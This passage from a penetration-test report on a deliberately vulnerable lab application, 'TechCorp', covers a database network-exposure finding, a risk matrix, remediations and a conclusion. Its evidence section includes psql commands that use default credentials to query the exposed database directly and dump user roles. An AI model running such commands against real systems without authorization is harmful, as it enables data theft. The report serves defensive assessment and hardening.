4. Alternatively, `docker exec` into the frontend container and connect to `postgres` over the `database-network`.

### Evidence

Direct host connection to PostgreSQL:

```bash
psql "postgresql://techcorp:techcorp@localhost:5432/techcorp" \
  -c "SELECT count(*) AS users FROM users;"
```

```text
 users
-------
     3
(1 row)
```

Connection from within the public-zone frontend container (bypassing the backend entirely):

```bash
docker exec techcorp-frontend sh -c \
  "psql postgresql://techcorp:techcorp@postgres:5432/techcorp -c 'SELECT username, role FROM users;'"
```

```text
 username | role
----------+-------
 user1    | USER
 user2    | USER
 admin    | ADMIN
(3 rows)
```

### Technical Impact

Complete bypass of all application-layer authorization: direct data extraction, modification, and deletion of any table. All of the application's security controls (authentication, RBAC, parameterized queries) are rendered irrelevant because the data tier is reachable directly.

### Business Impact

Total trust-boundary violation. Even a partially hardened application would be fully compromised by this network exposure, as the underlying data can be read and altered without touching the API.

### Root Cause

The vulnerable overlay publishes `ports: "5432:5432"` on the postgres service, attaches `frontend` to `database-network`, attaches `postgres` to `backend-network`, and leaves `database-network` as a standard (non-internal) bridge. The secure build keeps the database internal-only (`internal: true`), publishes no database port, and attaches the frontend only to `frontend-network` and `backend-network`.

---

# 7. Risk Summary Matrix

| Severity | Count | Finding IDs |
|----------|-------|-------------|
| Critical | 0 | — |
| **High** | **5** | VULN-001, VULN-002, VULN-003, VULN-004, VULN-007 |
| **Medium** | **3** | VULN-005, VULN-006, VULN-008 |
| Low | 0 | — |
| Informational | 0 | — |
| **Total** | **8** | VULN-001 – VULN-008 |

**Overall residual risk rating: HIGH** (driven primarily by VULN-003 authentication bypass, VULN-004 SQL injection, and the two authorization failures VULN-001/VULN-002).

---

# 8. Remediation Recommendations

Each recommendation below corresponds directly to the control implemented in the secure build of this same codebase, and was validated during the assessment.

| Finding | Remediation (as implemented in the secure build) |
|---------|----------------------------------------------------|
| VULN-001 | Enforce a server-side ownership check in `get_order()`: return `403 Forbidden` unless `order.user_id == current_user.id` **or** the requester has `role == "ADMIN"`. |
| VULN-002 | Bind all admin endpoints to the `require_admin()` dependency, which verifies `current_user.role == "ADMIN"` and rejects other roles with `403`. |
| VULN-003 | Generate a random, non-committed signing secret at boot (`secrets.token_urlsafe(48)`, overridable via `SECRET_KEY`), issue 30-minute expiry tokens (`TOKEN_EXPIRE_MINUTES=30`), and reject tokens without a valid `type == "access"` claim. |
| VULN-004 | Use parameterized queries with bound parameters for all database access (`ILIKE :pattern`), eliminating injection structurally. |
| VULN-005 | Render all user-controlled content with `textContent` instead of `innerHTML`, and inject a `Content-Security-Policy` meta tag (`default-src 'self'`) in secure mode. |
| VULN-006 | Disable debug mode and the verbose exception handler, disable `/docs` and `/openapi.json`, restrict CORS to explicit trusted origins, and register a middleware that emits `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Content-Security-Policy`, and `Cache-Control: no-store`. |
| VULN-007 | Compute unit prices and totals exclusively from the server-side product catalog, ignore client-supplied `price`/`status` at creation, validate quantity against stock, and enforce the `PENDING → PAID → SHIPPED → COMPLETED`/`CANCELLED` state machine on all status transitions. |
| VULN-008 | Mark `database-network` as `internal: true`, keep PostgreSQL unpublished to the host, and attach the frontend solely to `frontend-network` and `backend-network` (no frontend↔database connectivity). |

**Priority:** VULN-003, VULN-004, VULN-001, and VULN-002 should be remediated first — together they constitute a complete unauthenticated/privileged takeover chain. VULN-007, VULN-005, VULN-006, and VULN-008 should follow in the next remediation cycle. All eight remediations are already demonstrated in the secure build and can be validated by re-running the evidence commands in this report against it.

---

# 9. Conclusion

This assessment identified **8 vulnerabilities** in the vulnerable TechCorp build: **5 High** and **3 Medium**, spanning the OWASP Top 10 categories of Broken Access Control, Injection, Identification and Authentication Failures, Insecure Design, and Security Misconfiguration. The most impactful issues form a complete compromise chain: a publicly known JWT secret and non-expiring tokens (VULN-003) permit total authentication bypass; SQL injection (VULN-004) enables full database extraction; and the two authorization failures (VULN-001, VULN-002) expose every customer order and all administrative functions to any authenticated user. These are compounded by stored XSS (VULN-005), configuration weakness (VULN-006), business-logic tampering (VULN-007), and a trust-boundary violation that exposes the database to the host and public zone (VULN-008).

The key message of this engagement is that **all eight findings are addressed by the controls already present in the secure build** of the same codebase: server-side ownership checks, `require_admin()` role enforcement, randomly generated 30-minute-expiry signing secrets, parameterized queries, `textContent` rendering with CSP, hardened configuration and security headers, server-side catalog pricing with an enforced order state machine, and internal-only database networking. Adopting the secure build — or equivalently porting its controls into the production codebase — eliminates every vulnerability reported here, which was validated during the assessment by re-running the reproduction steps against the secure build.

Finally, this report describes attacks performed against a deliberately vulnerable, fully authorized local laboratory. The synthetic credentials, fixtures, and data used are part of the lab environment only. All findings, evidence, and code excerpts should be handled as CONFIDENTIAL and used solely for the purpose of remediating and hardening the TechCorp platform.

---

*End of report — TechCorp Enterprise VAPT Report, Version 1.0, 15 September 2026.*